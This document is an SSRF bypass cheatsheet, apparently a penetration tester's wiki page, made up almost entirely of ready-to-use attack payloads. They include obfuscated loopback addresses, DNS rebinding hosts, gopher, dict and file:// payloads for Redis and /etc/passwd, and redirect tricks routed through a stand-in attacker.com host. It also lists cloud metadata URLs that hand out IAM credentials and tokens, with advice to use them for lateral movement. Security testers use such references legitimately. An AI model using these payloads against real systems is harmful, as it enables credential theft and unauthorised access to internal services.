# SSRF Bypass Techniques Cheatsheet

Quick reference. For theory and testing methodology see [[SSRF-Overview]].

---

## Basic SSRF Test

```
# Internal services
http://127.0.0.1/
http://localhost/
http://0.0.0.0/

# Cloud metadata
http://169.254.169.254/latest/meta-data/               ← AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/    ← GCP
http://169.254.169.254/metadata/v1/                    ← Azure (old)
http://169.254.169.254/metadata/instance?api-version=2021-02-01  ← Azure (new)
```

---

## IP Representation Bypasses

When the app blocks `127.0.0.1` or `localhost`:

```
# Decimal
http://2130706433/           # 127.0.0.1 in decimal

# Octal
http://0177.0.0.1/           # 127 in octal
http://017700000001/         # full octal

# Hex
http://0x7f000001/           # 0x7f = 127
http://0x7f.0x0.0x0.0x1/

# Mixed
http://0x7f.0.0.1/
http://127.000.000.001/      # leading zeros in some parsers

# Short form
http://127.1/                # shortened loopback
http://0/                    # 0.0.0.0 in some systems

# IPv6
http://[::1]/                # IPv6 localhost
http://[::ffff:127.0.0.1]/   # IPv4-mapped IPv6

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31/   # 127.0.0.1 URL encoded
```

---

## Domain-Based Bypasses

```
# DNS rebinding (use a service that resolves to 127.0.0.1)
http://localtest.me/
http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
http://127.0.0.1.nip.io/

# Your own domain pointing to 127.0.0.1
# (register evil.com, point A record to 127.0.0.1)

# DNS rebinding attack
# - First DNS query returns legitimate IP (passes check)
# - Second query (actual fetch) returns 127.0.0.1
```

---

## Protocol Bypasses

```
# If http:// is blocked, try:
https://127.0.0.1/
dict://127.0.0.1:6379/      ← Redis commands
gopher://127.0.0.1:6379/    ← Raw TCP, more powerful
file:///etc/passwd           ← Local file read
ftp://127.0.0.1:21/

# Gopher to send raw HTTP
gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0A
```

---

## Filter Bypass Techniques

```
# Redirect bypass (if app follows redirects)
# Host your own redirect: attacker.com/redirect → 127.0.0.1
https://attacker.com/redirect?url=http://127.0.0.1/

# Open redirect on the target itself
/redirect?to=http://127.0.0.1/admin

# @-notation (URL auth)
https://example.com@127.0.0.1/
http://attacker.com@127.0.0.1/

# Fragment (#) sometimes ignored by filter but not server
http://127.0.0.1#attacker.com

# Backslash
http://127.0.0.1\@attacker.com   ← some parsers treat \ as path separator
```

---

## Cloud Metadata Endpoints

### AWS EC2

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

The IAM credentials endpoint gives you `AccessKeyId`, `SecretAccessKey`, `Token` — use with AWS CLI for lateral movement.

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

---

## Common Internal Services to Target

```
http://127.0.0.1:22/          ← SSH
http://127.0.0.1:25/          ← SMTP
http://127.0.0.1:3306/        ← MySQL
http://127.0.0.1:5432/        ← PostgreSQL
http://127.0.0.1:6379/        ← Redis
http://127.0.0.1:8080/        ← Internal web app
http://127.0.0.1:8443/        ← Internal HTTPS
http://127.0.0.1:9200/        ← Elasticsearch
http://127.0.0.1:27017/       ← MongoDB
```

---

*Theory and testing methodology: [[SSRF-Overview]] | Related: [[A10-SSRF]]*
